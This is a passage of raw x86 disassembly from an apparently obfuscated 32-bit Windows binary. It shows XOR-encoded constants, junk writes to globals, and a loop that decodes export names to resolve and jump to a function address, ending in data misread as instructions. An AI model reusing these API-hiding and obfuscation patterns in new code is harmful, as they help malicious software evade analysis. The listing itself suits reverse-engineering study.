  42195b:	or     eax,ecx
  42195d:	mov    ecx,DWORD PTR [ebp-0x54]
  421960:	xor    edx,edx
  421962:	div    ecx
  421964:	imul   eax,eax,0x7d53
  42196a:	mov    ecx,DWORD PTR [ebp+0x8]
  42196d:	lea    eax,[ecx+eax*1-0x1f534807]
  421974:	mov    ecx,DWORD PTR [ebp-0xf0]
  42197a:	and    ecx,0x4108
  421980:	and    ecx,0x40e7
  421986:	sub    ecx,0x1a54
  42198c:	xor    ecx,0x25ac
  421992:	mov    edx,DWORD PTR [ebp-0x104]
  421998:	xor    edx,0x6dda
  42199e:	mov    esi,DWORD PTR [ebp-0x108]
  4219a4:	and    edx,esi
  4219a6:	and    edx,0xe0c
  4219ac:	or     edx,0x5b
  4219af:	mov    esi,DWORD PTR [ebp-0xe8]
  4219b5:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  4219b9:	add    ecx,eax
  4219bb:	lea    eax,[edx+ecx*1-0xc5b]
  4219c2:	mov    DWORD PTR [ebp-0xa8],eax
  4219c8:	and    DWORD PTR [ebp-0x144],0x0
  4219cf:	jmp    0x4219e1
  4219d4:	mov    eax,DWORD PTR [ebp-0x144]
  4219da:	inc    eax
  4219db:	mov    DWORD PTR [ebp-0x144],eax
  4219e1:	mov    eax,DWORD PTR [ebp-0xe8]
  4219e7:	mov    ecx,DWORD PTR [ebp-0x144]
  4219ed:	cmp    ecx,DWORD PTR [eax+0x18]
  4219f0:	je     0x421fa9
  4219f6:	mov    eax,DWORD PTR [ebp-0x144]
  4219fc:	mov    ecx,DWORD PTR [ebp-0x38]
  4219ff:	mov    edx,DWORD PTR [ebp+0x8]
  421a02:	add    edx,DWORD PTR [ecx+eax*4]
  421a05:	mov    DWORD PTR [ebp-0x48],edx
  421a08:	mov    eax,DWORD PTR [ebp-0x48]
  421a0b:	mov    DWORD PTR [ebp-0x210],eax
  421a11:	mov    eax,DWORD PTR [ebp+0xc]
  421a14:	mov    DWORD PTR [ebp-0x20c],eax
  421a1a:	mov    DWORD PTR [ebp-0x1f0],0xca79a575
  421a24:	mov    DWORD PTR [ebp-0x1ec],0x9c1b89e8
  421a2e:	mov    DWORD PTR [ebp-0x1e0],0xca79a571
  421a38:	mov    DWORD PTR [ebp-0x1dc],0x9c1b89e8
  421a42:	lea    eax,[ebp-0x1e8]
  421a48:	mov    DWORD PTR [ebp-0x1f4],eax
  421a4e:	mov    eax,DWORD PTR [ebp-0x20c]
  421a54:	movzx  eax,WORD PTR [eax+0x20]
  421a58:	xor    eax,0xa49b
  421a5d:	movzx  eax,ax
  421a60:	sar    eax,1
  421a62:	mov    ecx,DWORD PTR [ebp-0x20c]
  421a68:	movzx  ecx,WORD PTR [ecx+0x20]
  421a6c:	xor    ecx,0xa49b
  421a72:	movzx  ecx,cx
  421a75:	shl    ecx,0xf
  421a78:	or     eax,ecx
  421a7a:	movzx  eax,ax
  421a7d:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421a83:	mov    DWORD PTR [ecx],eax
  421a85:	mov    eax,DWORD PTR [ebp-0x1e0]
  421a8b:	mov    edx,DWORD PTR [ebp-0x1dc]
  421a91:	xor    eax,0xca79a575
  421a96:	xor    edx,0x9c1b89e8
  421a9c:	mov    cl,0x2
  421a9e:	call   0x40a9b5
  421aa3:	mov    ebx,eax
  421aa5:	mov    esi,edx
  421aa7:	mov    eax,DWORD PTR [ebp-0x1e0]
  421aad:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ab3:	xor    eax,0xca79a575
  421ab8:	xor    edx,0x9c1b89e8
  421abe:	mov    cl,0x3e
  421ac0:	call   0x42223d
  421ac5:	or     ebx,eax
  421ac7:	or     esi,edx
  421ac9:	movzx  eax,bl
  421acc:	push   eax
  421acd:	lea    eax,[ebp-0x198]
  421ad3:	push   eax
  421ad4:	call   0x416c9e
  421ad9:	mov    eax,DWORD PTR [ebp-0x1f0]
  421adf:	mov    edx,DWORD PTR [ebp-0x1ec]
  421ae5:	xor    eax,0xca79a575
  421aea:	xor    edx,0x9c1b89e8
  421af0:	mov    cl,0x2
  421af2:	call   0x40a9b5
  421af7:	mov    esi,eax
  421af9:	mov    edi,edx
  421afb:	mov    eax,DWORD PTR [ebp-0x1f0]
  421b01:	mov    edx,DWORD PTR [ebp-0x1ec]
  421b07:	xor    eax,0xca79a575
  421b0c:	xor    edx,0x9c1b89e8
  421b12:	mov    cl,0x3e
  421b14:	call   0x42223d
  421b19:	or     esi,eax
  421b1b:	or     edi,edx
  421b1d:	mov    DWORD PTR [ebp-0x1f8],esi
  421b23:	jmp    0x421b78
  421b28:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b2e:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b34:	xor    eax,0xca79a575
  421b39:	xor    edx,0x9c1b89e8
  421b3f:	mov    cl,0x2
  421b41:	call   0x40a9b5
  421b46:	mov    esi,eax
  421b48:	mov    edi,edx
  421b4a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421b50:	mov    edx,DWORD PTR [ebp-0x1dc]
  421b56:	xor    eax,0xca79a575
  421b5b:	xor    edx,0x9c1b89e8
  421b61:	mov    cl,0x3e
  421b63:	call   0x42223d
  421b68:	or     esi,eax
  421b6a:	or     edi,edx
  421b6c:	add    esi,DWORD PTR [ebp-0x1f8]
  421b72:	mov    DWORD PTR [ebp-0x1f8],esi
  421b78:	mov    eax,DWORD PTR [ebp-0x1e8]
  421b7e:	cmp    DWORD PTR [ebp-0x1f8],eax
  421b84:	je     0x421c17
  421b8a:	mov    eax,DWORD PTR [ebp-0x1f8]
  421b90:	mov    ecx,DWORD PTR [ebp-0x20c]
  421b96:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  421b9b:	xor    eax,0xa49b
  421ba0:	movzx  eax,ax
  421ba3:	sar    eax,1
  421ba5:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421bab:	mov    edx,DWORD PTR [ebp-0x20c]
  421bb1:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421bb6:	xor    ecx,0xa49b
  421bbc:	movzx  ecx,cx
  421bbf:	shl    ecx,0xf
  421bc2:	or     eax,ecx
  421bc4:	movzx  eax,ax
  421bc7:	mov    DWORD PTR [ebp-0x1fc],eax
  421bcd:	mov    eax,DWORD PTR [ebp-0x1f8]
  421bd3:	mov    ecx,DWORD PTR [ebp-0x20c]
  421bd9:	movzx  eax,WORD PTR [ecx+eax*4]
  421bdd:	xor    eax,0xa49b
  421be2:	movzx  eax,ax
  421be5:	sar    eax,1
  421be7:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421bed:	mov    edx,DWORD PTR [ebp-0x20c]
  421bf3:	movzx  ecx,WORD PTR [edx+ecx*4]
  421bf7:	xor    ecx,0xa49b
  421bfd:	movzx  ecx,cx
  421c00:	shl    ecx,0xf
  421c03:	or     eax,ecx
  421c05:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421c0b:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421c12:	jmp    0x421b28
  421c17:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c1d:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c23:	xor    eax,0xca79a575
  421c28:	xor    edx,0x9c1b89e8
  421c2e:	mov    cl,0x2
  421c30:	call   0x40a9b5
  421c35:	mov    esi,eax
  421c37:	mov    edi,edx
  421c39:	mov    eax,DWORD PTR [ebp-0x1f0]
  421c3f:	mov    edx,DWORD PTR [ebp-0x1ec]
  421c45:	xor    eax,0xca79a575
  421c4a:	xor    edx,0x9c1b89e8
  421c50:	mov    cl,0x3e
  421c52:	call   0x42223d
  421c57:	or     esi,eax
  421c59:	or     edi,edx
  421c5b:	mov    DWORD PTR [ebp-0x1e4],esi
  421c61:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c67:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c6d:	xor    eax,0xca79a575
  421c72:	xor    edx,0x9c1b89e8
  421c78:	mov    cl,0x2
  421c7a:	call   0x40a9b5
  421c7f:	mov    esi,eax
  421c81:	mov    edi,edx
  421c83:	mov    eax,DWORD PTR [ebp-0x1e0]
  421c89:	mov    edx,DWORD PTR [ebp-0x1dc]
  421c8f:	xor    eax,0xca79a575
  421c94:	xor    edx,0x9c1b89e8
  421c9a:	mov    cl,0x3e
  421c9c:	call   0x42223d
  421ca1:	or     esi,eax
  421ca3:	or     edi,edx
  421ca5:	mov    DWORD PTR [ebp-0x23c],esi
  421cab:	mov    DWORD PTR [ebp-0x238],edi
  421cb1:	mov    eax,DWORD PTR [ebp-0x23c]
  421cb7:	or     eax,DWORD PTR [ebp-0x238]
  421cbd:	je     0x421f1d
  421cc3:	lea    eax,[ebp-0x204]
  421cc9:	mov    DWORD PTR [ebp-0x208],eax
  421ccf:	mov    eax,DWORD PTR [ebp-0x1e4]
  421cd5:	xor    edx,edx
  421cd7:	mov    cl,0x2
  421cd9:	call   0x42223d
  421cde:	mov    esi,eax
  421ce0:	mov    edi,edx
  421ce2:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ce8:	xor    edx,edx
  421cea:	mov    cl,0x3e
  421cec:	call   0x40a9b5
  421cf1:	or     esi,eax
  421cf3:	or     edi,edx
  421cf5:	xor    esi,0xca79a575
  421cfb:	xor    edi,0x9c1b89e8
  421d01:	mov    eax,DWORD PTR [ebp-0x208]
  421d07:	mov    DWORD PTR [eax],esi
  421d09:	mov    DWORD PTR [eax+0x4],edi
  421d0c:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d12:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d1a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d20:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d26:	xor    eax,0xca79a575
  421d2b:	xor    edx,0x9c1b89e8
  421d31:	mov    cl,0x2
  421d33:	call   0x40a9b5
  421d38:	mov    ebx,eax
  421d3a:	mov    edi,edx
  421d3c:	mov    eax,DWORD PTR [ebp-0x1e0]
  421d42:	mov    edx,DWORD PTR [ebp-0x1dc]
  421d48:	xor    eax,0xca79a575
  421d4d:	xor    edx,0x9c1b89e8
  421d53:	mov    cl,0x3e
  421d55:	call   0x42223d
  421d5a:	or     ebx,eax
  421d5c:	or     edi,edx
  421d5e:	movsx  eax,bl
  421d61:	cmp    esi,eax
  421d63:	je     0x421ec3
  421d69:	mov    eax,DWORD PTR [ebp-0x1e4]
  421d6f:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421d77:	mov    eax,DWORD PTR [ebp-0x204]
  421d7d:	mov    edx,DWORD PTR [ebp-0x200]
  421d83:	xor    eax,0xca79a575
  421d88:	xor    edx,0x9c1b89e8
  421d8e:	mov    cl,0x2
  421d90:	call   0x40a9b5
  421d95:	mov    edi,eax
  421d97:	mov    ebx,edx
  421d99:	mov    eax,DWORD PTR [ebp-0x204]
  421d9f:	mov    edx,DWORD PTR [ebp-0x200]
  421da5:	xor    eax,0xca79a575
  421daa:	xor    edx,0x9c1b89e8
  421db0:	mov    cl,0x3e
  421db2:	call   0x42223d
  421db7:	or     edi,eax
  421db9:	or     ebx,edx
  421dbb:	mov    eax,DWORD PTR [ebp-0x210]
  421dc1:	movsx  eax,BYTE PTR [eax+edi*1]
  421dc5:	cmp    esi,eax
  421dc7:	je     0x421dd7
  421dcd:	jmp    0x421f1d
  421dd2:	jmp    0x421ec3
  421dd7:	mov    eax,DWORD PTR [ebp-0x204]
  421ddd:	mov    edx,DWORD PTR [ebp-0x200]
  421de3:	xor    eax,0xca79a575
  421de8:	xor    edx,0x9c1b89e8
  421dee:	mov    cl,0x2
  421df0:	call   0x40a9b5
  421df5:	mov    esi,eax
  421df7:	mov    edi,edx
  421df9:	mov    eax,DWORD PTR [ebp-0x204]
  421dff:	mov    edx,DWORD PTR [ebp-0x200]
  421e05:	xor    eax,0xca79a575
  421e0a:	xor    edx,0x9c1b89e8
  421e10:	mov    cl,0x3e
  421e12:	call   0x42223d
  421e17:	or     esi,eax
  421e19:	or     edi,edx
  421e1b:	mov    eax,DWORD PTR [ebp-0x210]
  421e21:	movsx  esi,BYTE PTR [eax+esi*1]
  421e25:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e2b:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e31:	xor    eax,0xca79a575
  421e36:	xor    edx,0x9c1b89e8
  421e3c:	mov    cl,0x2
  421e3e:	call   0x40a9b5
  421e43:	mov    ebx,eax
  421e45:	mov    edi,edx
  421e47:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e4d:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e53:	xor    eax,0xca79a575
  421e58:	xor    edx,0x9c1b89e8
  421e5e:	mov    cl,0x3e
  421e60:	call   0x42223d
  421e65:	or     ebx,eax
  421e67:	or     edi,edx
  421e69:	movsx  eax,bl
  421e6c:	cmp    esi,eax
  421e6e:	jne    0x421ec3
  421e74:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e7a:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e80:	xor    eax,0xca79a575
  421e85:	xor    edx,0x9c1b89e8
  421e8b:	mov    cl,0x2
  421e8d:	call   0x40a9b5
  421e92:	mov    esi,eax
  421e94:	mov    edi,edx
  421e96:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e9c:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ea2:	xor    eax,0xca79a575
  421ea7:	xor    edx,0x9c1b89e8
  421ead:	mov    cl,0x3e
  421eaf:	call   0x42223d
  421eb4:	or     esi,eax
  421eb6:	or     edi,edx
  421eb8:	mov    DWORD PTR [ebp-0x214],esi
  421ebe:	jmp    0x421f67
  421ec3:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ec9:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ecf:	xor    eax,0xca79a575
  421ed4:	xor    edx,0x9c1b89e8
  421eda:	mov    cl,0x2
  421edc:	call   0x40a9b5
  421ee1:	mov    esi,eax
  421ee3:	mov    edi,edx
  421ee5:	mov    eax,DWORD PTR [ebp-0x1e0]
  421eeb:	mov    edx,DWORD PTR [ebp-0x1dc]
  421ef1:	xor    eax,0xca79a575
  421ef6:	xor    edx,0x9c1b89e8
  421efc:	mov    cl,0x3e
  421efe:	call   0x42223d
  421f03:	or     esi,eax
  421f05:	or     edi,edx
  421f07:	add    esi,DWORD PTR [ebp-0x1e4]
  421f0d:	mov    DWORD PTR [ebp-0x1e4],esi
  421f13:	jmp    0x421c61
  421f18:	jmp    0x421c61
  421f1d:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f23:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f29:	xor    eax,0xca79a575
  421f2e:	xor    edx,0x9c1b89e8
  421f34:	mov    cl,0x2
  421f36:	call   0x40a9b5
  421f3b:	mov    esi,eax
  421f3d:	mov    edi,edx
  421f3f:	mov    eax,DWORD PTR [ebp-0x1f0]
  421f45:	mov    edx,DWORD PTR [ebp-0x1ec]
  421f4b:	xor    eax,0xca79a575
  421f50:	xor    edx,0x9c1b89e8
  421f56:	mov    cl,0x3e
  421f58:	call   0x42223d
  421f5d:	or     esi,eax
  421f5f:	or     edi,edx
  421f61:	mov    DWORD PTR [ebp-0x214],esi
  421f67:	mov    eax,DWORD PTR [ebp-0x214]
  421f6d:	mov    DWORD PTR [ebp-0xc8],eax
  421f73:	cmp    DWORD PTR [ebp-0xc8],0x0
  421f7a:	je     0x421fa4
  421f80:	mov    eax,DWORD PTR [ebp-0x144]
  421f86:	mov    ecx,DWORD PTR [ebp-0xac]
  421f8c:	movzx  eax,WORD PTR [ecx+eax*2]
  421f90:	mov    ecx,DWORD PTR [ebp-0xa8]
  421f96:	mov    eax,DWORD PTR [ecx+eax*4]
  421f99:	mov    DWORD PTR [ebp-0xfc],eax
  421f9f:	jmp    0x421fa9
  421fa4:	jmp    0x4219d4
  421fa9:	cmp    DWORD PTR [ebp-0xfc],0x0
  421fb0:	jne    0x421fbd
  421fb6:	xor    eax,eax
  421fb8:	jmp    0x422236
  421fbd:	mov    eax,DWORD PTR [ebp+0x8]
  421fc0:	add    eax,DWORD PTR [ebp-0xfc]
  421fc6:	mov    DWORD PTR [ebp-0xec],eax
  421fcc:	mov    DWORD PTR [ebp-0x74],0x0
  421fd3:	cmp    DWORD PTR [ebp-0xb0],0x0
  421fda:	je     0x422056
  421fe0:	cmp    DWORD PTR [ebp-0xb0],0x0
  421fe7:	je     0x422056
  421fed:	mov    eax,DWORD PTR [ebp-0xb0]
  421ff3:	shl    eax,0x2
  421ff6:	mov    DWORD PTR [ebp-0x74],eax
  421ff9:	mov    DWORD PTR [ebp-0x14c],0x0
  422003:	sub    esp,DWORD PTR [ebp-0x74]
  422006:	mov    DWORD PTR [ebp-0x14c],esp
  42200c:	mov    DWORD PTR [ebp-0x148],0x0
  422016:	mov    eax,DWORD PTR [ebp-0x148]
  42201c:	cmp    eax,DWORD PTR [ebp-0xb0]
  422022:	je     0x422056
  422028:	mov    eax,DWORD PTR [ebp-0x148]
  42202e:	mov    ecx,DWORD PTR [ebp-0x14c]
  422034:	mov    edx,DWORD PTR [ebp-0x148]
  42203a:	mov    esi,DWORD PTR [ebp+0x14]
  42203d:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  422041:	mov    DWORD PTR [ecx+eax*4],edx
  422044:	mov    eax,DWORD PTR [ebp-0x148]
  42204a:	inc    eax
  42204b:	mov    DWORD PTR [ebp-0x148],eax
  422051:	jmp    0x422016
  422056:	mov    DWORD PTR [ebp-0x9c],0x0
  422060:	push   0x4221ef
  422065:	jmp    DWORD PTR [ebp-0xec]
  42206b:	mov    eax,eax
  42206d:	mov    ecx,esp
  42206f:	ret    0xc
  422072:	cmp    DWORD PTR ds:0x42830f,0x0
  422079:	mov    DWORD PTR ds:0x42830b,0x7476
  422083:	mov    DWORD PTR ds:0x428187,0x1cdc
  42208d:	mov    DWORD PTR ds:0x42830b,0x65fa
  422097:	mov    DWORD PTR ds:0x428177,0x5dca
  4220a1:	jmp    0x4220eb
  4220a6:	mov    eax,ds:0x428307
  4220ab:	cmp    DWORD PTR ds:0x42830f,0x0
  4220b2:	jbe    0x4220d3
  4220b8:	push   0x24f1
  4220bd:	call   DWORD PTR ds:0x428d88
  4220c3:	inc    DWORD PTR ds:0x4283b3
  4220c9:	sub    DWORD PTR ds:0x428193,0x46d9
  4220d3:	inc    DWORD PTR ds:0x42830f
  4220d9:	adc    DWORD PTR ds:0x42831b,ebx
  4220df:	or     DWORD PTR ds:0x428243,0x4029
  4220e9:	not    eax
  4220eb:	push   ebx
  4220ec:	push   esi
  4220ed:	sbb    DWORD PTR ds:0x42839f,edx
  4220f3:	mov    eax,DWORD PTR [esp+0x18]
  4220f7:	or     eax,eax
  4220f9:	jne    0x422129
  4220ff:	mov    ecx,DWORD PTR [esp+0x14]
  422103:	mov    eax,DWORD PTR [esp+0x10]
  422107:	xor    edx,edx
  422109:	div    ecx
  42210b:	xor    DWORD PTR ds:0x42819f,0x45f1
  422115:	mov    ebx,eax
  422117:	mov    eax,DWORD PTR [esp+0xc]
  42211b:	div    ecx
  42211d:	mov    edx,0x36e3
  422122:	mov    edx,ebx
  422124:	jmp    0x4221ea
  422129:	mov    ecx,eax
  42212b:	sbb    eax,0x67a9
  422130:	mov    ebx,DWORD PTR [esp+0x14]
  422134:	cmp    DWORD PTR ds:0x428307,0x0
  42213b:	mov    edx,DWORD PTR ds:0x4283b7
  422141:	mov    DWORD PTR ds:0x428337,0x4bc7
  42214b:	mov    edx,DWORD PTR ds:0x42831f
  422151:	jmp    0x42219b
  422156:	mov    DWORD PTR ds:0x428267,0x15f
  422160:	mov    DWORD PTR ds:0x42829f,0x4dd1
  42216a:	cmp    DWORD PTR ds:0x428307,0x0
  422171:	jle    0x42218e
  422177:	push   0x824e
  42217c:	call   DWORD PTR ds:0x428d8c
  422182:	xor    DWORD PTR ds:0x42831f,0x6c44
  42218c:	sub    edx,edx
  42218e:	sbb    DWORD PTR ds:0x428267,0x445e
  422198:	dec    edx
  422199:	not    edx
  42219b:	mov    edx,DWORD PTR [esp+0x10]
  42219f:	mov    eax,DWORD PTR [esp+0xc]
  4221a3:	shr    ecx,1
  4221a5:	rcr    ebx,1
  4221a7:	shr    edx,1
  4221a9:	rcr    eax,1
  4221ab:	or     ecx,ecx
  4221ad:	jne    0x4221a3
  4221b3:	div    ebx
  4221b5:	mov    esi,eax
  4221b7:	mul    DWORD PTR [esp+0x18]
  4221bb:	mov    ecx,eax
  4221bd:	mov    eax,DWORD PTR [esp+0x14]
  4221c1:	mul    esi
  4221c3:	add    edx,ecx
  4221c5:	jb     0x4221e5
  4221cb:	cmp    edx,DWORD PTR [esp+0x10]
  4221cf:	ja     0x4221e5
  4221d5:	jb     0x4221e6
  4221db:	cmp    eax,DWORD PTR [esp+0xc]
  4221df:	jbe    0x4221e6
  4221e5:	dec    esi
  4221e6:	xor    edx,edx
  4221e8:	mov    eax,esi
  4221ea:	pop    esi
  4221eb:	pop    ebx
  4221ec:	ret    0x10
  4221ef:	or     DWORD PTR ds:0x428383,0x42838f
  4221f9:	sub    DWORD PTR [ebp+0x10],0x1
  4221fd:	mov    DWORD PTR ds:0x42818b,0x43bf
  422207:	cmp    DWORD PTR [ebp+0x10],0x0
  42220b:	mov    DWORD PTR ds:0x42837b,0x612a
  422215:	je     0x422224
  42221b:	xor    DWORD PTR ds:0x428177,edx
  422221:	add    esp,DWORD PTR [ebp-0x74]
  422224:	mov    DWORD PTR [ebp-0x9c],eax
  42222a:	mov    DWORD PTR ds:0x42827f,ebx
  422230:	mov    eax,DWORD PTR [ebp-0x9c]
  422236:	pop    edi
  422237:	pop    esi
  422238:	pop    ebx
  422239:	leave  
  42223a:	ret    0x10
  42223d:	cmp    cl,0x40
  422240:	mov    DWORD PTR ds:0x428263,0x43a8
  42224a:	jae    0x42229c
  422250:	mov    DWORD PTR ds:0x428197,0x42f2
  42225a:	cmp    cl,0x20
  42225d:	mov    DWORD PTR ds:0x42817f,0x3d58
  422267:	jae    0x422287
  42226d:	or     DWORD PTR ds:0x428173,0x5e1e
  422277:	shld   edx,eax,cl
  42227a:	mov    DWORD PTR ds:0x428297,0x1bd2
  422284:	shl    eax,cl
  422286:	ret    
  422287:	inc    edx
  422288:	mov    edx,eax
  42228a:	sub    DWORD PTR ds:0x4283b3,0x42830b
  422294:	xor    eax,eax
  422296:	and    cl,0x1f
  422299:	shl    edx,cl
  42229b:	ret    
  42229c:	xor    eax,eax
  42229e:	xor    edx,edx
  4222a0:	ret    
	...
  4222ad:	add    BYTE PTR [eax],al
  4222af:	add    cl,ch
  4222b1:	cmp    ebp,DWORD PTR [ebx+0x14]
  4222b4:	cmp    al,0x26
  4222b6:	sub    al,0x44
  4222b8:	jno    0x422323
  4222ba:	ja     0x422321
  4222bc:	int3   
  4222bd:	fsubr  QWORD PTR [edx+0x1e]
  4222c0:	jo     0x422327
  4222c2:	popa   
  4222c3:	ins    BYTE PTR es:[edi],dx
  4222c4:	push   eax
  4222c5:	lods   eax,DWORD PTR ds:[esi]
  4222c6:	xor    DWORD PTR [esi+0x41],edi
  4222c9:	ins    BYTE PTR es:[edi],dx
  4222ca:	popa   
  4222cb:	outs   dx,BYTE PTR ds:[esi]
  4222cc:	add    BYTE PTR [eax],al
  4222ce:	add    BYTE PTR [eax],al
  4222d0:	addr16 jb 0x422338
  4222d3:	popa   
  4222d4:	je     0x42233d
  4222d6:	jb     0x42233d
  4222d8:	popa   
  4222d9:	je     0x422342
  4222db:	jb     0x422342
  4222dd:	popa   
  4222de:	je     0x422347
  4222e0:	jb     0x422347
  4222e2:	popa   
  4222e3:	je     0x42234c
  4222e5:	jb     0x42234c
  4222e7:	popa   
  4222e8:	je     0x422351
  4222ea:	jb     0x422351
  4222ec:	popa   
  4222ed:	je     0x422356
  4222ef:	jb     0x422356
  4222f1:	popa   
  4222f2:	je     0x42235b
  4222f4:	jb     0x42235b
  4222f6:	popa   
  4222f7:	je     0x422360
  4222f9:	jb     0x422360
  4222fb:	popa   
  4222fc:	je     0x422365
  4222fe:	jb     0x422365
  422300:	popa   
  422301:	je     0x422303
  422303:	add    BYTE PTR [eax+0x65],ch
  422306:	ins    BYTE PTR es:[edi],dx
  422307:	ins    BYTE PTR es:[edi],dx
  422308:	push   0x686c6c65
  42230d:	gs ins BYTE PTR es:[edi],dx
  42230f:	ins    BYTE PTR es:[edi],dx
  422310:	push   0x686c6c65
  422315:	gs ins BYTE PTR es:[edi],dx
  422317:	ins    BYTE PTR es:[edi],dx
  422318:	push   0x686c6c65
  42231d:	gs ins BYTE PTR es:[edi],dx
  42231f:	ins    BYTE PTR es:[edi],dx
  422320:	push   0x686c6c65
  422325:	gs ins BYTE PTR es:[edi],dx
  422327:	ins    BYTE PTR es:[edi],dx
  422328:	push   0x686c6c65
  42232d:	gs ins BYTE PTR es:[edi],dx
  42232f:	ins    BYTE PTR es:[edi],dx
  422330:	push   0x686c6c65
  422335:	gs ins BYTE PTR es:[edi],dx
  422337:	ins    BYTE PTR es:[edi],dx
  422338:	add    BYTE PTR [eax],al
  42233a:	add    BYTE PTR [eax],al
  42233c:	outs   dx,DWORD PTR ds:[esi]
  42233d:	add    BYTE PTR [eax+eax*1+0x65],ch
  422341:	add    BYTE PTR [ecx+0x0],ah
  422344:	jne    0x422346
  422346:	je     0x422348
  422348:	xor    eax,DWORD PTR [eax]
  42234a:	xor    al,BYTE PTR [eax]
  42234c:	add    BYTE PTR [eax],al
  42234e:	add    BYTE PTR [eax],al
  422350:	push   0x61006500
  422355:	add    BYTE PTR [esi+0x0],dh
  422358:	add    BYTE PTR gs:[esi+0x0],ch
  42235c:	push   0x61006500
  422361:	add    BYTE PTR [esi+0x0],dh
  422364:	add    BYTE PTR gs:[esi+0x0],ch
  422368:	push   0x61006500
  42236d:	add    BYTE PTR [esi+0x0],dh
  422370:	add    BYTE PTR gs:[esi+0x0],ch
  422374:	push   0x61006500
  422379:	add    BYTE PTR [esi+0x0],dh
  42237c:	add    BYTE PTR gs:[esi+0x0],ch
  422380:	push   0x61006500
  422385:	add    BYTE PTR [esi+0x0],dh
  422388:	add    BYTE PTR gs:[esi+0x0],ch
  42238c:	push   0x61006500
  422391:	add    BYTE PTR [esi+0x0],dh
  422394:	add    BYTE PTR gs:[esi+0x0],ch
  422398:	push   0x61006500
  42239d:	add    BYTE PTR [esi+0x0],dh
  4223a0:	add    BYTE PTR gs:[esi+0x0],ch
  4223a4:	push   0x61006500
  4223a9:	add    BYTE PTR [esi+0x0],dh
  4223ac:	add    BYTE PTR gs:[esi+0x0],ch
  4223b0:	push   0x61006500
  4223b5:	add    BYTE PTR [esi+0x0],dh
  4223b8:	add    BYTE PTR gs:[esi+0x0],ch
  4223bc:	add    BYTE PTR [eax],al
  4223be:	add    BYTE PTR [eax],al
  4223c0:	cmp    al,0x23
  4223c2:	inc    edx
  4223c3:	add    BYTE PTR [edi+0x6c],cl
  4223c6:	gs dec ecx
  4223c8:	arpl   WORD PTR [edi+0x6e],bp
  4223cb:	push   esp
  4223cc:	outs   dx,DWORD PTR ds:[esi]
  4223cd:	inc    ebx
  4223ce:	jne    0x422442
  4223d0:	jae    0x422441
  4223d2:	jb     0x4223d4
  4223d4:	les    esp,FWORD PTR [ebx]
  4223d6:	inc    edx
	...
  4223df:	add    BYTE PTR [eax-0x77ffbdd9],al
  4223e5:	daa    
  4223e6:	inc    edx
  4223e7:	add    BYTE PTR [eax+0x26],al
  4223ea:	inc    edx
  4223eb:	add    dl,dh
  4223ed:	inc    ebx
  4223ee:	push   ebx
  4223ef:	mov    WORD PTR ds:0x1a49ba4,ss
  4223f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f6:	popf   
  4223f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223f8:	jno    0x42239e
  4223fa:	xchg   edi,eax
  4223fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223fc:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  422403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422404:	sbb    DWORD PTR [ebp+eax*4-0x445b645c],esp
  42240b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42240c:	rol    DWORD PTR [edx-0x5b6a732f],cl
  422412:	adc    eax,0x1a49ba4
  422417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422418:	popf   
  422419:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42241a:	jno    0x4223c0
  42241c:	xchg   edi,eax
  42241d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42241e:	or     esp,DWORD PTR [ecx+ecx*4-0x7c5bac5c]
  422425:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422426:	xor    eax,0x9ba485a4
  42242b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42242c:	mov    ebx,0xd1e2d3a4
  422431:	in     al,dx
  422432:	xchg   ebp,eax
  422433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422434:	adc    eax,0x3ba49ba4
  422439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42243a:	popf   
  42243b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42243c:	sbb    DWORD PTR [ebp+edx*4-0x705b805c],esp
  422443:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422444:	fwait
  422445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422446:	xchg   DWORD PTR [ebx+edx*8-0xe332e3e],esp
  42244d:	sub    al,0xf7
  42244f:	cs pop ss
  422451:	push   cs
  422452:	adc    eax,0x3a49108
